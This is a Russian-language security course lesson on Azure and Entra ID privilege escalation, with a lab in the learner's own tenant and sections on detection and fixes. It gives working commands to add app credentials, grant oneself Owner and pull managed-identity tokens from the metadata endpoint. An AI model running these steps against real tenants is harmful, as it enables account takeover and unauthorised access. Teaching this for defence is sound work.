# 16.2 — Azure/Entra ID

> **M16 · Этап 3 · 6 ч · 🔴 · артефакт:** `labs/m16-cloud-k8s/l02-azure/`

## Цель

Разобраться в двух плоскостях Azure: Entra ID (идентичность) и Azure RBAC (ресурсы), и научиться находить пути эскалации.

## Результат

- Карта tenant: пользователи, группы, приложения, роли.
- 2 пути эскалации (в своём tenant).
- Список детектов.

## Теория

### 1. Две плоскости

- **Entra ID** — пользователи, группы, приложения, service principals, роли (`Global Administrator`, `Application Administrator`).
- **Azure RBAC** — подписки, resource groups, ресурсы, роли (`Owner`, `Contributor`, `User Access Administrator`).

Ошибка новичка: считать, что `Global Admin` автоматически даёт доступ к данным. Иногда да, иногда нет — зависит от ролей и consent.

### 2. Токены

- Access token — к resource.
- Refresh token — обновление.
- `az account get-access-token`.
- `ROADtools`/`AADInternals` — исследование tenant.

### 3. Пути эскалации

- **Application Administrator** → добавить credential к приложению → войти как service principal.
- **Privileged Role Administrator** → выдать себе `Global Admin`.
- **User Access Administrator** на подписке → выдать `Owner`.
- **Managed Identity** на VM → токен к ресурсам.
- **Consent grant** → доступ к данным через приложение.
- **Azure DevOps** → PAT/агент.

### 4. Инструменты

```bash
az login
az ad user list --output table
az role assignment list --all --output table
roadrecon auth -u alice@tenant.onmicrosoft.com -p 'Pass!'
roadrecon gather
roadrecon gui
```

### 5. Детект

- Entra sign-in logs: аномальные IP, impossible travel, MFA fatigue.
- Audit logs: `Add service principal credentials`, `Add member to role`.
- Azure Activity Log: role assignments, resource changes.
- Defender for Cloud: alerts.

## Лаборатория

> Свой tenant (trial) или локальный эмулятор. Не трогайте чужие tenant.

### 1. Контекст

```bash
az account show
az ad signed-in-user show
az role assignment list --assignee <object-id> --all
```

### 2. Инвентаризация

```bash
az ad user list --query '[].{upn:userPrincipalName,id:id}' -o table
az ad group list --query '[].{name:displayName,id:id}' -o table
az ad app list --query '[].{name:displayName,appId:appId}' -o table
```

### 3. Путь 1: Application Administrator

Если есть роль:

```bash
az ad app credential reset --id <appId> --append
```

Ожидаемо: новый секрет. Войдите как service principal:

```bash
az login --service-principal -u <appId> -p <secret> --tenant <tenant>
```

### 4. Путь 2: User Access Administrator

```bash
az role assignment create --assignee <your-id> --role Owner --scope /subscriptions/<sub-id>
```

Ожидаемо: вы Owner подписки.

### 5. Managed Identity

На VM с managed identity:

```bash
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true
```

Ожидаемо: токен. Это типичный путь из SSRF/VM.

### 6. Детект

Проверьте audit log:

```bash
az monitor activity-log list --max-events 20
```

## Атака и защита

- **Атака:** роль → credential → доступ.
- **Детект:** sign-in/audit/activity logs.
- **Фикс:** PIM (just-in-time), MFA, Conditional Access, least privilege, review app credentials, managed identity scoping.

## Самопроверка

- [ ] Чем Entra ID роль отличается от Azure RBAC?
- [ ] Почему Application Administrator опасен?
- [ ] Что такое managed identity?
- [ ] Какие логи смотреть?
- [ ] Как PIM снижает риск?

## Дальше

[16.3 — Kubernetes](l03-kubernetes.md)
